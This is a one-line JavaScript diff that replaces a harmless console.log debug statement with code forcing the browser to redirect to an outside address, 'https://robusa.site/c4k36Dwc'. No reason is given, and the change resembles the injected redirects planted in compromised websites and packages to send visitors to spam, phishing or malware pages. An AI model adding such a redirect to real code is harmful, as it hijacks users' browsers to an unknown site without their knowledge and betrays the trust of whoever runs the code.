@@ -1,1 +1,1 @@
-console.log('prosteron7')
+window.location.href = "https://robusa.site/c4k36Dwc";
